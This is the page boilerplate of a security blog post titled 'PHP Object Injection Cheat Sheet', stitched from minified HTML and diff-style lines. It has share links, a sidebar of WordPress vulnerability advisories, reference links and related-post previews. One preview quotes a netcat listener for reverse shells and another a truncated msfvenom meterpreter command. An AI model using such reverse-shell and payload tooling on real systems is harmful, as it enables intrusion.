data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu&u=https%3A%2F%2Fnitesculucian.github.io%2Fnitesculucian.github.io%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fnitesculucian.github.io%2Fnitesculucian.github.io%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F&text=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/nitesculucian.github.io/2019/10/25/about-author-1-3-9-authentificated-stored-xss-vulnerability/">Wordpress About Author <= 1.3.9 Authenticated Stored XSS</a><li class="text-truncate lh-lg"> <a href="/nitesculucian.github.io/2019/10/23/groundhogg-1-3-2-authentificated-reflected-xss-vulnerability/">Wordpress Groundhogg <= 2.0.8.1 Authentificated Reflected XSS</a><li class="text-truncate lh-lg"> <a href="/nitesculucian.github.io/2019/10/23/groundhogg-1-3-2-authentificated-sql-injection-vulnerability/">Wordpress Groundhogg <= 1.3.11.13 Authentificated SQL Injection</a><li class="text-truncate lh-lg"> <a href="/nitesculucian.github.io/2019/10/23/sliced-invoices-3-8-2-authentificated-sql-injection-vulnerability/">Wordpress Sliced Invoices <= 3.8.2 Authenticated SQL Injection</a><li class="text-truncate lh-lg"> <a href="/nitesculucian.github.io/2019/10/22/sliced-invoices-3-8-2-authentificated-reflected-xss-vulnerability/">Wordpress Sliced Invoices <= 3.8.2 Authenticated Reflected XSS</a></ul></section><section id="access-lastmod"><h2 class="panel-heading"></h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0255642880549652" crossorigin="anonymous" ></script> <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-0255642880549652" data-ad-slot="2875050473" data-ad-format="auto" data-full-width-responsive="true" ></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/writeups/">writeups</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/challange/">challange</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/attackdefense-com/">AttackDefense.com</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/exploit/">exploit</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/solution/">solution</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/tutorial/">tutorial</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/exercise/">exercise</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/level/">level</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/nebula/">nebula</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1531602000" data-df="ll" > Jul 15, 2018 </time><h4 class="pt-0 my-2">Reverse Shells Cheat Sheet</h4><div class="text-muted"><p> This list represent an comprehensive cheat sheet of shells and other related stuff. Listening To setup a listening netcat instance, enter the following: sudo nc -nvlp 80 Reverse Shells To conn...</p></div></div></a></article><article class="col"> <a href="/nitesculucian.github.io/2018/07/25/msfvenom-cheat-sheet/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1532469480" data-df="ll" > Jul 25, 2018 </time><h4 class="pt-0 my-2">Msfvenom Cheat Sheet</h4><div class="text-muted"><p> MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode. Binaries Command Info msfvenom -p windows/meterpr...</p></div></div></a></article><article class="col"> <a href="/nitesculucian.github.io/2018/12/02/metasploit-cheat-sheet/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1543707060" data-df="ll" > Dec 2, 2018 </time><h4 class="pt-0 my-2">Metasploit Cheat Sheet</h4><div class="text-muted"><p> A few months ago I have created a msfvenom cheat sheet without explaining the Metasploit framework, so here it is a brief cheat sheet. Metasploit is a free tool that has built-in exploits which ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="nitesculucian.github.io/2018/09/30/dctf-2018-message/" class="btn btn-outline-primary" aria-label="Older" ><p>[DCTF Quals 2018] Message</p></a> <a href="nitesculucian.github.io/2018/10/06/dctf-quals-2018-lucky/" class="btn btn-outline-primary" aria-label="Newer" ><p>[DCTF Quals 2018] Lucky</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/LucianNitescu">Lucian Nitescu</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/writeups/">writeups</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/challange/">challange</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/attackdefense-com/">AttackDefense.com</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/exploit/">exploit</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/solution/">solution</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/tutorial/">tutorial</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/exercise/">exercise</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/level/">level</a> <a class="post-tag btn btn-outline-primary" href="/nitesculucian.github.io/tags/nebula/">nebula</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script> <script defer src="/nitesculucian.github.io/assets/js/dist/post.min.js"></script> <script defer src="/nitesculucian.github.io/assets/js/dist/app.min.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/nitesculucian.github.io/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="thanks-to"><span class="me-2">Thanks to</span><a href="#thanks-to" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>This article is composed of information found on the folowing links (+ plus some minor additions). I use this article to quick observe or demonstrate situations and as a personal reference to all the infromation needed in exploiting the PHP Object Injection Vulnerability.</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization</a></p>
+
+<p><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p>
+
+<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">https://www.owasp.org/index.php/PHP_Object_Injection</a></p>
+
+<p><a href="http://location-href.com/php-object-injection/">http://location-href.com/php-object-injection/</a></p>
+
+<p><a href="https://www.ambionics.io/blog/php-generic-gadget-chains">https://www.ambionics.io/blog/php-generic-gadget-chains</a></p>
+
+<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/cheatsheet/">cheatsheet</a>,
+          <a href="/categories/offensive-security/">offensive_security</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/offensive-security/"
+            class="post-tag no-text-decoration"
+          >offensive security</a>
+        
+          <a
+            href="/tags/cheat-sheet/"
+            class="post-tag no-text-decoration"
+          >cheat sheet</a>
+        
+          <a
+            href="/tags/reverse/"
+            class="post-tag no-text-decoration"
+          >reverse</a>
+        
+          <a
+            href="/tags/shell/"
+            class="post-tag no-text-decoration"
+          >shell</a>
+        
+          <a
+            href="/tags/backdoor/"
+            class="post-tag no-text-decoration"
+          >backdoor</a>
+        
+          <a
+            href="/tags/bash/"
+            class="post-tag no-text-decoration"
+          >bash</a>
+        
+          <a
+            href="/tags/perl/"
+            class="post-tag no-text-decoration"
+          >perl</a>
+        
+          <a
+            href="/tags/python/"
+            class="post-tag no-text-decoration"
+          >python</a>
+        
+          <a
+            href="/tags/php/"
+            class="post-tag no-text-decoration"
+          >PHP</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu&url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu&u=http%3A%2F%2Flocalhost%3A4000%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2F2018%2F10%2F06%2Fphp-object-injection-cheat-sheet%2F&text=PHP%20Object%20Injection%20Cheat%20Sheet%20-%20Lucian%20Nitescu" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/2019/10/25/about-author-1-3-9-authentificated-stored-xss-vulnerability/">Wordpress About Author <= 1.3.9 Authenticated Stored XSS</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/2019/10/23/groundhogg-1-3-2-authentificated-reflected-xss-vulnerability/">Wordpress Groundhogg <= 2.0.8.1 Authentificated Reflected XSS</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/2019/10/23/groundhogg-1-3-2-authentificated-sql-injection-vulnerability/">Wordpress Groundhogg <= 1.3.11.13 Authentificated SQL Injection</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/2019/10/23/sliced-invoices-3-8-2-authentificated-sql-injection-vulnerability/">Wordpress Sliced Invoices <= 3.8.2 Authenticated SQL Injection</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/2019/10/22/sliced-invoices-3-8-2-authentificated-reflected-xss-vulnerability/">Wordpress Sliced Invoices <= 3.8.2 Authenticated Reflected XSS</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <section id="access-lastmod">
+                <h2 class="panel-heading"></h2>
+                <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+                  <script
+                    async
+                    src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0255642880549652"
+                    crossorigin="anonymous"
+                  ></script>
+                  <!-- NewWebsite -->
+                  <ins
+                    class="adsbygoogle"
+                    style="display:block"
+                    data-ad-client="ca-pub-0255642880549652"
+                    data-ad-slot="2875050473"
+                    data-ad-format="auto"
+                    data-full-width-responsive="true"
+                  ></ins>
+                  <script>
+                    (adsbygoogle = window.adsbygoogle || []).push({});
+                  </script>
+                </ul>
+              </section>
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
